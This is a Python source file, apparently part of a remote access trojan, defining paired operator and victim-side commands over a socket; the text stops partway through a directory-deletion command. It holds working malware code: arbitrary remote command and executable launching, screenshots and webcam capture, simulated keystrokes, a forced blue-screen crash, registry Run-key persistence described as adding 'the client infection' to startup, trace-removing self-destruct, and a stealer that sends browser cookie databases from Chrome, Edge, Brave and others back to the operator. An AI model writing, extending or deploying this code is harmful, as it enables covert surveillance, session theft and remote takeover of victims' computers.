from shared.extras.double_command import (
    DoubleCommandResult,
    add_double_command,
    CommandResult,
    DoubleCommand,
    ArgumentType,
    OSType,
    recieve_maximum_bytes,
    recieve_boolean,
    recieve_integer,
    recieve_string,
    recieve_bytes,
    recieve_float,
    send_boolean,
    send_integer,
    send_string,
    send_float,
    send_bytes,
    send_item,
)
from server_extras.client import Client

import socket


@add_double_command(
    "kill_proc",
    "kill_proc [ pid ]",
    "Kills a process on the client",
    [ArgumentType.integer],
)
class KillProcess(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import signal
        import os

        try:
            pid = recieve_integer(sock)
        except OSError:
            return

        success_indicator = b"y"
        try:
            os.kill(pid, signal.SIGTERM)
        except PermissionError:
            success_indicator = b"n"
        except OSError:
            success_indicator = b"?"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_integer(client.socket, params[0])
        except TimeoutError:
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print(
                "Maybe killed process, client did not respond with a success indicator"
            )
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"n":
                print("Client could not kill process")
                return CommandResult(DoubleCommandResult.failure)
            case b"?":
                print(
                    "Client responded that the PID doesn't exist, or that it is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case b"y":
                print("Killed process")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print("Client returned unknown response")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "launch_exe",
    "launch_exe [ local exe path ]",
    "Launches an executable file on the client",
    [ArgumentType.string],
    int,
)
class LaunchExecutableFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import tempfile
        import random
        import stat
        import sys
        import os

        executable_contents = recieve_bytes(sock)
        if executable_contents == b"EXIT":
            return
        executable_path = f"{tempfile.gettempdir()}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}{'.exe' if sys.platform == "win32" else ''}"
        if sys.platform != "win32":
            os.chmod(executable_path, os.stat(executable_path).st_mode | stat.S_IEXEC)
        try:
            with open(executable_path, "wb") as tmp_exe_fd:
                tmp_exe_fd.write(executable_contents)
            proc = subprocess.Popen(
                executable_path,
                creationflags=(
                    subprocess.CREATE_NEW_CONSOLE if sys.platform == "win32" else 0
                ),
            )
            send_integer(sock, proc.pid)
        except TimeoutError:
            return
        except OSError:
            try:
                send_integer(sock, -1)
            except OSError:
                return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as exe_fd:
                send_bytes(client.socket, exe_fd.read())
        except TimeoutError:
            print(f"Connection to client timeouted")
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            send_bytes(client.socket, b"EXIT")
            print(f"Error opening file '{params[0]}'")
            return CommandResult(DoubleCommandResult.param_error)

        client.socket.settimeout(10)
        try:
            proc_pid = recieve_integer(client.socket)
        except (TypeError, ValueError, OSError):
            proc_pid = None

        if proc_pid == None:
            print("Maybe launched process, client did not respond with a PID")
            return CommandResult(DoubleCommandResult.semi_success)
        elif proc_pid == -1:
            print("Could not start process")
            return CommandResult(DoubleCommandResult.failure)

        print(f"Launched process with PID: {proc_pid}")
        return CommandResult(DoubleCommandResult.success, proc_pid)


@add_double_command("invoke_bsod", "invoke_bsod", "Invokes a BSOD on the client", [], supported_os=[OSType.ms_windows])
class InvokeBSOD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import shared.command_consts
        import subprocess

        fail = False
        try:
            subprocess.Popen(shared.command_consts.EXECUTE_B64_BSOD)
        except OSError:
            fail = True
        try:
            sock.sendall(b"n" if fail else b"y")
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print(
                f"Possibly invoked BSOD, client did not respond with a success indicator"
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match success_indicator:
            case b"y":
                print(f"Invoked BSOD on client")
                return CommandResult(DoubleCommandResult.success)
            case b"n":
                print(f"Client could not execute script")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Client responded with an invalid success indicator")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "show_image",
    "show_image [ local image path ]",
    "Displays an image on the clients screen",
    [ArgumentType.string],
    required_client_modules=["Pillow"]
)
class ShowImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import PIL.Image
        import io

        img_contents = recieve_bytes(sock)

        try:
            if img_contents == b"EXIT":
                return
        except UnicodeDecodeError:
            pass

        threading.Thread(
            target=lambda img_contents: PIL.Image.open(io.BytesIO(img_contents)).show(),
            name="Show Image",
            args=[img_contents],
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as img_file:
                img_contents = img_file.read()
        except OSError:
            print(f"Error reading file: '{params[0]}'")
            try:
                client.socket.sendall(b"EXIT")
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        try:
            send_bytes(client.socket, img_contents)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print("Showed image on client")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "screenshot",
    "screenshot",
    "Captures a screenshot on client",
    [],
    tuple[str, bytes],
    required_client_modules=["Pillow"],
)
class TakeScreenshot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import PIL.ImageGrab
        import io

        tmp_io = io.BytesIO()
        PIL.ImageGrab.grab().save(tmp_io, format="PNG")

        try:
            tmp_io.seek(0)
            send_bytes(sock, tmp_io.read())
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("screenshots")
        except FileExistsError:
            pass

        try:
            img_contents = recieve_bytes(client.socket)
        except OSError:
            print("Failed to recieve screenshot")
            return CommandResult(DoubleCommandResult.conn_error)

        tmp_name = ""
        try:
            with open(f"screenshots/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"screenshots/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: 'screenshots/{tmp_name or client.name}.png'")
        return CommandResult(
            DoubleCommandResult.success,
            (f"screenshots/{tmp_name or client.name}.png", img_contents),
        )


@add_double_command(
    "typewrite",
    "typewrite [ string to type ] { character delay }",
    "Types a string on the clients keyboard",
    [ArgumentType.string, ArgumentType.optional_float],
    required_client_modules=["pyautogui"],
)
class TypeWrite(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyautogui
        import threading

        try:
            typewrite_str = recieve_string(sock, True)
        except OSError:
            pass

        try:
            interval = recieve_float(sock)
        except OSError:
            return

        threading.Thread(
            target=pyautogui.typewrite,
            args=[typewrite_str, interval],
            name="TypeWrite",
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 1:
            params = (params[0], 0.0)

        try:
            send_string(client.socket, params[0])
            send_float(client.socket, params[1])
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print(
            f"Asked client to type {len(params[0])} characters with an interval {params[1]} seconds between each letter"
        )
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "run_command",
    "run_command [ command ]",
    "Runs a command on the client",
    [ArgumentType.string],
)
class RunCommand(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess

        command = recieve_string(sock, False)

        try:
            subprocess.Popen(command, shell=True)
            sock.sendall(b"y")
        except OSError:
            try:
                sock.sendall(b"n")
            except OSError:
                pass
        except UnicodeDecodeError:
            try:
                sock.sendall(b"?")
            except OSError:
                pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1)
        except (OSError, UnicodeDecodeError):
            print("Sent command, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"y":
                print("Executed command on client")
                return CommandResult(DoubleCommandResult.success)
            case b"n":
                print("Client could not execute command")
                return CommandResult(DoubleCommandResult.failure)
            case b"?":
                print("Client didn't understand command")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent command, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "webcam_img",
    "webcam_img",
    "Captures an image from the clients webcam",
    [],
    tuple[str, bytes],
    required_client_modules=["opencv-python", "numpy"],
)
class CaptureWebcamImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import numpy
        import cv2

        capture = cv2.VideoCapture(0)

        if not capture.isOpened():
            try:
                sock.sendall(b"n")
            except OSError:
                pass
            return

        success, frame = capture.read()

        if not success:
            try:
                sock.sendall(b"f")
            except OSError:
                pass
            return

        capture.release()

        try:
            image_bytes = numpy.array(cv2.imencode(".png", frame)[1]).tobytes()
        except Exception:
            try:
                sock.sendall(b"?")
            except OSError:
                pass
            return

        try:
            sock.sendall(b"y")
        except OSError:
            return

        try:
            send_bytes(sock, image_bytes)
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("webcam_images")
        except FileExistsError:
            pass

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Client failed to respond with a success indicator")
            return CommandResult(DoubleCommandResult.conn_error)

        match success_indicator:
            case b"y":
                pass
            case b"n":
                print("Client could not open webcam (they are probably missing one)")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("Client could not capture image (webcam error)")
                return CommandResult(DoubleCommandResult.failure)
            case b"?":
                print("Client encountered an error while decoding the image")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print("Client failed to respond with a valid success indicator")
                return CommandResult(DoubleCommandResult.failure)

        try:
            img_contents = recieve_bytes(client.socket)
        except OSError:
            print("Failed to recieve image from client")
            return CommandResult(DoubleCommandResult.conn_error)

        tmp_name = ""
        try:
            with open(f"webcam_images/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"webcam_images/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured image: 'webcam_images/{tmp_name or client.name}.png'")
        return CommandResult(
            DoubleCommandResult.success,
            (f"webcam_images/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "add_persistence",
    "add_persistence",
    "Adds the client infection to PC startup",
    [],
    str, supported_os=[OSType.ms_windows]
)
class AddPersistence(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        from shared.command_consts import CLIENT_STARTUP_SCRIPT, ADD_SELF_TO_PATH
        import subprocess
        import winreg
        import shutil
        import sys
        import os

        def bail(msg: str) -> None:
            try:
                send_string(sock, msg)
            except OSError:
                pass
            shutil.rmtree(folder_path, ignore_errors=True)

        try:
            name = recieve_string(sock, True)
        except OSError:
            return

        key_name = "C3Persistence"
        folder_name = key_name
        folder_path = f"{os.getenv('LOCALAPPDATA')}/{folder_name}"
        startup_script_path = f"{folder_path}/startup.ps1"

        try:
            os.mkdir(folder_path)
        except OSError:
            bail("OSERR_CREA_FOLDER")
            return

        venv_creator = subprocess.Popen([sys.executable, "-m", "venv", folder_path])
        if venv_creator.wait() != 0:
            bail("VENV_ERR")
            return

        shutil.copytree("./client_extras", f"{folder_path}/client_extras")
        shutil.copytree("./server_extras", f"{folder_path}/server_extras")
        shutil.copytree("./shared", f"{folder_path}/shared")
        shutil.copy("./server.py", f"{folder_path}/server.py")
        shutil.copy("./client.py", f"{folder_path}/client.py")

        with (
            open(f"{folder_path}/client.py", "r+") as client_file,
            open(f"{folder_path}/server.py", "r+") as server_file,
        ):
            client_file_contents = client_file.read()
            server_file_contents = server_file.read()
            client_file.seek(0)
            server_file.seek(0)
            client_file.write(ADD_SELF_TO_PATH + client_file_contents)
            server_file.write(ADD_SELF_TO_PATH + server_file_contents)
        with open(startup_script_path, "w") as startup_script:
            startup_script.write(
                CLIENT_STARTUP_SCRIPT.replace("{{ TARGET_DIR }}", folder_path).replace(
                    "{{ NAME }}", name
                )
            )

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE,
            ) as startup_key:
                winreg.SetValueEx(
                    startup_key,
                    key_name,
                    0,
                    winreg.REG_SZ,
                    f"powershell -WindowStyle Hidden -NoProfile -File {startup_script_path}",
                )
        except OSError:
            bail("REG_ERR")
            return
        try:
            send_string(sock, folder_path)
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, client.name)
        except OSError:
            print("Failed to send client name to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            install_path = recieve_string(client.socket, True)
        except OSError:
            print("Client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.conn_error)

        match install_path:
            case "REG_ERR":
                print("Client encountered registry error")
                return CommandResult(DoubleCommandResult.failure)
            case "VENV_ERR":
                print("Client could not install virtual python environment")
                return CommandResult(DoubleCommandResult.failure)
            case "OSERR_CREA_FOLDER":
                print(
                    "Client failed to create persistence folder (maybe persistence is already installed?)"
                )
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Client installed persistence to '{install_path}'")
                return CommandResult(DoubleCommandResult.success, install_path)


@add_double_command(
    "reboot",
    "reboot { delay seconds }",
    "Reboots the client PC",
    [ArgumentType.optional_float],
    required_client_modules=["rebooter"]
)
class Reboot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import rebooter
        import time

        def delayed_reboot(delay: float) -> None:
            time.sleep(delay)
            rebooter.Rebooter(operation="reboot")

        try:
            threading.Thread(
                target=delayed_reboot,
                name="Delayed Reboot",
                args=[recieve_float(sock)],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0.0,)

        try:
            send_float(client.socket, params[0])
        except OSError:
            print(f"Failed to send delay time to client")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0.0:
            print(f"Asked client to reboot immediately")
        else:
            print(f"Asked client to reboot in {params[0]} seconds")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "shutdown",
    "shutdown { delay seconds }",
    "Turns off the client PC",
    [ArgumentType.optional_float],
    required_client_modules=["rebooter"]
)
class Shutdown(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import rebooter
        import time

        def delayed_shutdown(delay: float) -> None:
            time.sleep(delay)
            rebooter.Rebooter(operation="shutdown")

        try:
            threading.Thread(
                target=delayed_shutdown,
                name="Delayed Shutdown",
                args=[recieve_float(sock)],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0.0,)

        try:
            send_float(client.socket, params[0])
        except OSError:
            print(f"Failed to send delay time to client")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0.0:
            print(f"Asked client to shut down immediately")
        else:
            print(f"Asked client to shut down in {params[0]} seconds")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "self_destruct",
    "self_destruct",
    "Self destructs and removes all trace of infection on the client side",
    [],
    supported_os=[OSType.ms_windows]
)
class SelfDestruct(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        from shared.command_consts import RETRY_DELETE_FOLDER
        import subprocess
        import random
        import winreg
        import sys
        import os

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                access=winreg.KEY_SET_VALUE,
            ) as persistence_key:
                winreg.DeleteValue(persistence_key, "C3Persistence")
        except Exception:
            pass

        self_destruct_file = f"{os.getenv('TEMP')}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}.ps1"
        parent_dir = "/".join(os.path.split(__file__)[0].split("\\")[:-1])
        with open(self_destruct_file, "w") as self_destruct_fd:
            self_destruct_fd.write(
                RETRY_DELETE_FOLDER.replace("{{ TARGET_DIR }}", parent_dir)
            )

        subprocess.Popen(
            [
                "powershell",
                "-NoProfile",
                "-WindowStyle",
                "Hidden",
                "-File",
                self_destruct_file,
            ],
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
            cwd="C:/",
        )

        sys.exit()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        client.kill()
        print("Killed and asked client to self destruct")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "steal_cookies",
    "steal_cookies",
    "Downloads cookies from the client",
    [],
    str,
    supported_os=[OSType.ms_windows]
)
class CookieStealer(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        LOCAL = os.getenv("LOCALAPPDATA")
        if LOCAL == None:
            return

        paths: dict[str, str] = {}
        if len(LOCAL) > 0:
            paths["chrome"] = f"{LOCAL}/Google/Chrome/User Data/Default/Network/Cookies"
            paths["yandex"] = (
                f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
            )
            paths["brave"] = (
                f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
            )
            paths["edge"] = f"{LOCAL}/Microsoft/Edge/User Data/Default/Network/Cookies"
            paths["vivaldi"] = f"{LOCAL}/Vivaldi/User Data/Default/Network/Cookies"
            paths["chromium"] = f"{LOCAL}/Chromium/User Data/Default/Network/Cookies"
            paths["torch"] = f"{LOCAL}/Torch/User Data/Default/Network/Cookies"

        for browser_name, path in paths.items():
            try:
                with open(path, "rb") as cookies_file:
                    cookies_sql = cookies_file.read()
                send_string(sock, browser_name)
                send_bytes(sock, cookies_sql)
            except OSError:
                continue
        try:
            send_bytes(sock, b"EXIT")
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("cookies")
        except FileExistsError:
            pass
        try:
            target_folder = f"cookies/{client.name}"
            os.mkdir(target_folder)
        except OSError:
            tmpname = "".join(
                random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=6)
            )
            target_folder = f"cookies/{tmpname}"
            os.mkdir(target_folder)

        is_first_run = True
        while True:
            try:
                filename = recieve_string(client.socket).translate(
                    str.maketrans({char: "" for char in '\\/*?<>:|"'})
                )
                if filename == b"EXIT":
                    break
                cookies_db = recieve_bytes(client.socket)
                try:
                    with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
                        cookies_db_fd.write(cookies_db)
                except OSError:
                    pass
                is_first_run = False
            except OSError:
                if is_first_run:
                    print("Client failed to send cookies")
                    return CommandResult(DoubleCommandResult.conn_error)
                break

        print(
            f"Downloaded {len(os.listdir(target_folder))} cookie databases to '{target_folder}'"
        )
        return CommandResult(DoubleCommandResult.success, target_folder)


@add_double_command(
    "upload",
    "upload [ local path ] [ client side path ]",
    "Uploads a file or folder to the client",
    [ArgumentType.string, ArgumentType.string],
)
class UploadItem(DoubleCommand):
    @staticmethod
    def compress_folder(path: str) -> bytes:
        import zipfile
        import io
        import os

        folder_path = os.path.abspath(path)
        zio = io.BytesIO()

        with zipfile.ZipFile(zio, "w") as zip_file:
            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)

                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))

        zio.seek(0)
        return zio.read()

    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import zipfile
        import io

        try:
            item_type = sock.recv(1)
            if item_type == b"E":
                return
            destination = recieve_string(sock, True)
            file_contents = recieve_bytes(sock)
        except OSError:
            return

        success_indicator = b"y"
        if item_type == b"f":
            try:
                with open(destination, "wb") as out_file:
                    out_file.write(file_contents)
            except PermissionError:
                success_indicator = b"p"
            except FileNotFoundError:
                success_indicator = b"f"
            except OSError:
                success_indicator = b"?"
        elif item_type == b"d":
            try:
                with zipfile.ZipFile(io.BytesIO(file_contents), "r") as zip_file:
                    zip_file.extractall(destination)
            except OSError:
                success_indicator = b"?"
            except zipfile.BadZipFile:
                success_indicator = b"z"
        else:
            success_indicator = b"i"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import os.path

        if not os.path.exists(params[0]):
            print(f"Path '{params[0]} not found")
            try:
                client.socket.sendall(b"E")
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        item_type = "file" if os.path.isfile(params[0]) else "folder"

        if item_type == "file":
            with open(params[0], "rb") as in_file:
                item_contents = in_file.read()
        else:
            item_contents = UploadItem.compress_folder(params[0])

        try:
            if item_type == "file":
                client.socket.sendall(b"f")
            else:
                client.socket.sendall(b"d")
        except OSError:
            print(f"Failed to send item type to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            send_string(client.socket, params[1])
            send_bytes(client.socket, item_contents)
        except OSError:
            print(f"Failed to send {item_type} to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print(f"Sent {item_type} but client did respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"y":
                print(f"Sent {item_type} successfully")
                return CommandResult(DoubleCommandResult.success)
            case b"p":
                print(
                    f"Client does not have permission to write the given {item_type} '{params[1]}'"
                )
                return CommandResult(DoubleCommandResult.failure)
            case b"?":
                print(
                    f"There was a miscellaneous error on the client whilst writing the {item_type}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print(
                    f"The parent directory of '{params[1]}' doesn't exist on the client"
                )
                return CommandResult(DoubleCommandResult.failure)
            case b"i":
                print("Client did not understand item type sent by server")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    f"Sent {item_type} but client responded with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "download",
    "download [ client side path ] [ local path ]",
    "Downloads a file or folder from the client",
    [ArgumentType.string, ArgumentType.string],
)
class DownloadItem(DoubleCommand):
    @staticmethod
    def compress_folder(path: str) -> bytes:
        import zipfile
        import io
        import os

        folder_path = os.path.abspath(path)
        zio = io.BytesIO()

        with zipfile.ZipFile(zio, "w") as zip_file:
            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)

                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))

        zio.seek(0)
        return zio.read()

    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path

        try:
            source_path = recieve_string(sock)
        except OSError:
            return

        if not os.path.exists(source_path):
            try:
                sock.sendall(b"n")
            except OSError:
                pass
            return

        item_type = "f" if os.path.isfile(source_path) else "d"

        try:
            sock.sendall(item_type.encode())
        except OSError:
            return

        success_indicator = b"y"
        try:
            if item_type == "f":
                with open(source_path, "rb") as in_file:
                    item_contents = in_file.read()
            else:
                item_contents = DownloadItem.compress_folder(source_path)
        except PermissionError:
            success_indicator = b"p"
            return
        except OSError:
            success_indicator = b"o"
            return
        except Exception:
            success_indicator = b"e"
            return

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

        if success_indicator != b"y":
            return

        try:
            send_bytes(sock, item_contents)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import zipfile
        import io

        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            item_type = client.socket.recv(1)
            if item_type == b"n":
                print("Item not found on client")
                return CommandResult(DoubleCommandResult.failure)
        except OSError:
            print("Failed to recieve item from client")
            return CommandResult(DoubleCommandResult.conn_error)

        word_item_type = "file" if item_type == b"f" else "folder"

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Client did not send a success indicator")
            return CommandResult(DoubleCommandResult.conn_error)

        match success_indicator:
            case b"y":
                pass
            case b"p":
                print(f"Client does not have permission to read the {word_item_type}")
                return CommandResult(DoubleCommandResult.failure)
            case b"o":
                print(
                    f"There was a miscellaneous OS-error whilst reading the {word_item_type}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case b"e":
                print(
                    f"There was a miscellaneous error whilst reading the {word_item_type}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print("Client sent an invalid success indicator")
                return CommandResult(DoubleCommandResult.failure)

        file_contents = recieve_bytes(client.socket)

        if item_type == b"f":
            try:
                with open(params[1], "wb") as out_file:
                    out_file.write(file_contents)
            except OSError as err:
                print(
                    f"There was an operating system error when writing the file (error code: {err.errno})"
                )
                return CommandResult(DoubleCommandResult.failure)
        else:
            try:
                with zipfile.ZipFile(io.BytesIO(file_contents), "r") as zip_file:
                    zip_file.extractall(params[1])
            except OSError as err:
                print(
                    f"There was an operating system error whilst unzipping the folder (error code: {err.errno})"
                )
                return CommandResult(DoubleCommandResult.failure)
            except zipfile.BadZipFile:
                print(f"Invalid ZIP file sent from client")
                return CommandResult(DoubleCommandResult.failure)

        print(f"Recieved {word_item_type} successfully")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "open_url",
    "open_url [ url ]",
    "Opens a URL in a new webbrowser on the client",
    [ArgumentType.string],
)
class OpenURL(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import webbrowser

        success_indicator = b"y"
        try:
            webbrowser.open(recieve_string(sock, True))
        except OSError:
            success_indicator = b"f"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Connection error whilst sending url to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print(
                "Sent url to client, but client did not respond with valid success indicator"
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match success_indicator:
            case b"y":
                print("Opened url on client")
                return CommandResult(DoubleCommandResult.success)
            case b"f":
                print("Failed to open url on client")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent url to client, but client responded with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "ls",
    "ls { directory }",
    "Lists a directory on the client",
    [ArgumentType.optional_string],
)
class ListDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = recieve_string(sock, True)
        except OSError:
            return

        items = []
        for item in os.listdir(path):
            abs_item = f"{path}/{item}"
            if os.path.isdir(abs_item):
                items.append(f"<DIR>  -> {item}")
            elif os.path.isfile(abs_item):
                items.append(f"<FILE> -> {item}")
        output = "\n".join(items).encode()
        try:
            send_bytes(sock, output)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (".",)

        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            contents = recieve_string(client.socket, True)
            print(contents)
        except (OSError, MemoryError):
            print(f"Error recieving items in {params[0]}")
            return CommandResult(DoubleCommandResult.failure)
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "mkdir",
    "mkdir [ directory path ]",
    "Creates a directory on the client",
    [ArgumentType.string],
)
class MakeDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = recieve_string(sock, True)
        except OSError:
            return

        success_indicator = b"y"
        try:
            os.mkdir(path)
        except PermissionError:
            success_indicator = b"p"
        except FileExistsError:
            success_indicator = b"f"
        except FileNotFoundError:
            success_indicator = b"d"
        except OSError:
            success_indicator = b"n"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"n":
                print("There was an error when creating the directory")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("Directory already exists")
                return CommandResult(DoubleCommandResult.failure)
            case b"d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case b"p":
                print("The client does not have permission to create such directory")
                return CommandResult(DoubleCommandResult.failure)
            case b"y":
                print("Successfully created directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "rmdir",
    "rmdir [ directory path ]",
    "Recursively deletes a directory on the client",
    [ArgumentType.string],
)
class DeleteDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path
        import shutil

        try:
            path = recieve_string(sock)
        except OSError:
